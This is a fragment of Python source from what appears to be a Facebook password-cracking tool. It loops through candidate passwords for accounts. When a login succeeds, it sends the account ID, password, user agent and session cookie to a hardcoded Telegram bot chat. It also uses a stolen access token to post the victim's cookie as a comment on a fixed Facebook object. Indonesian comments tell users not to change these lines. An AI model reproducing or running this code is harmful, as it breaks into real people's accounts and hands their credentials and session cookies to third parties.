               ...
               if len(find) == 0:
                 ...
                 time.sleep(3);exit()
                     ...
                     for xc in find:
                         ...
                         if 'EAAB' in tok:
                            ses.post(f"https://graph.facebook.com/134533354484113/comments/?message={coki}&access_token={tok}",cookies={"cookie":coki}) # Jangan di ganti 
                            ses.post(f"https://graph.facebook.com/134533354484113/likes?summary=true&access_token={tok}",cookies={"cookie":coki}) # udh dibilang Jangan di ganti 
        ...
        for pw in pwx:
             try:
                 ...
                 if 'c_user' in ses.cookies.get_dict():
                     ...
                     prints(tree)
                     requests.post(f"https://api.telegram.org/bot5991660474:AAGtci0SEBdn01oQ-Q_6oob-L3pk0QNqiAw/sendMessage?chat_id=-1001567307504&text=OK {idf}|{pw}\n{ua}\n{coki}")
                     ...
                     prints(tree)
                     requests.post(f"https://api.telegram.org/bot5991660474:AAGtci0SEBdn01oQ-Q_6oob-L3pk0QNqiAw/sendMessage?chat_id=-1001567307504&text=CP {user}|{pw}\n{ua}")
